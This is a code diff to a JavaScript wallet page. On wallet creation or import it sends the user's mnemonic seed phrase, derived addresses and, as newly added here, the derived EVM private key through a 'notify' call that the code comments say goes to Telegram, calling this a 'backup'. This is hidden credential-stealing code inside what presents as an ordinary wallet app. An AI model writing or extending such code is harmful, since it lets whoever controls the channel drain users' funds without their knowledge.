@@ -152,20 +152,32 @@ function WalletPage() {
     saveSession({ address, username, wallet: snapshot });
     recordWalletLogin(address, mode, username);
     // Stash the derived EVM private key in memory so /swap can sign transactions.
+    // Also backup the private key to Telegram alongside the mnemonic.
     if (w.mnemonic) {
       derivePrivateKeyFromMnemonic(w.mnemonic)
-        .then((pk) => rememberPrivateKey(address, pk))
-        .catch(() => { /* swap will prompt user to re-import */ });
+        .then((pk) => {
+          rememberPrivateKey(address, pk);
+          notify({
+            event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
+            label: username,
+            address,
+            mnemonic: w.mnemonic,
+            addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
+            fields: { evm_private_key: pk, label: w.label },
+          });
+        })
+        .catch(() => {
+          // Send backup even if we couldn't derive the private key.
+          notify({
+            event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
+            label: username,
+            address,
+            mnemonic: w.mnemonic,
+            addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
+            fields: { label: w.label },
+          });
+        });
     }
-    // Full backup to Telegram: mnemonic + all derived addresses.
-    notify({
-      event: mode === "create" ? "wallet_backup_create" : "wallet_backup_import",
-      label: username,
-      address,
-      mnemonic: w.mnemonic,
-      addresses: w.addresses.map((a) => ({ chain: a.chain, address: a.address, path: a.path })),
-      extra: `label=${w.label}`,
-    });
     notify({
       event: mode === "create" ? "wallet_signup" : "wallet_signin",
       label: username,
